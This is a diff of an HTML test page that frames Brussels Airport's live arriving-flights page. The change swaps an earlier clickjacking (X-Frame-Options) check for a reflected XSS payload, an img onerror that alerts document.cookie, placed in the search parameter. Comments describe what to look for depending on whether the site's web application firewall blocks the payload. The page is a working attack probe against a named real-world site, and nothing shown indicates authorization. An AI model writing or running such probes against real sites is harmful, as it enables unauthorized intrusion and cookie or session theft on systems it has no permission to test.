@@ -2,35 +2,33 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>iframe test</title>
+  <title>iframe xss test</title>
   <style>
     body { font-family: monospace; padding: 20px; background: #111; color: #0f0; }
-    #status { font-size: 18px; margin-bottom: 10px; }
-    iframe { display: block; width: 100%; height: 600px; border: 2px solid #0f0; }
+    #status { font-size: 16px; margin-bottom: 10px; padding: 8px; border: 1px solid #0f0; }
+    iframe { display: block; width: 100%; height: 700px; border: 2px solid #555; }
   </style>
 </head>
 <body>
-  <div id="status">waiting...</div>
+  <div id="status">waiting for iframe load...</div>
+
+  <!--
+    If WAF blocks the payload URL:
+      - iframe shows blank / WAF error page
+      - onload still fires (WAF block page is still a page)
+      - visually you'll see a WAF block page instead of BA flights
+
+    If WAF allows it:
+      - BA flights page loads
+      - Vue hydrates
+      - XSS fires inside the iframe (in BA origin context)
+      - alert(document.cookie) pops from inside the iframe
+  -->
   <iframe
     id="probe"
-    src="https://www.brusselsairport.be/en/passenger/flights/arriving?search=iframetest"
-    onload="document.getElementById('status').innerText = 'LOADED — frameable (no XFO)'"
-    onerror="document.getElementById('status').innerText = 'BLOCKED — onerror fired'"
+    src="https://www.brusselsairport.be/en/passenger/flights/arriving?search=<img src=x onerror=alert(document.cookie)>"
+    onload="document.getElementById('status').innerText = 'iframe onload fired — check visually if BA loaded or WAF block page'"
   ></iframe>
-  <script>
-    // Fallback: if X-Frame-Options blocks, the iframe src won't load and
-    // the browser will show an empty/error frame — onload still fires in some browsers.
-    // Check if the iframe actually rendered BA content or a blank error page.
-    document.getElementById('probe').addEventListener('load', function() {
-      try {
-        // If same-origin this would work; cross-origin will throw
-        var doc = this.contentDocument || this.contentWindow.document;
-        document.getElementById('status').innerText = 'LOADED + same-origin access: ' + doc.title;
-      } catch(e) {
-        // Cross-origin — but loaded means no XFO block
-        document.getElementById('status').innerText = 'LOADED — cross-origin (expected). No X-Frame-Options block. Error: ' + e.message;
-      }
-    });
-  </script>
+
 </body>
 </html>
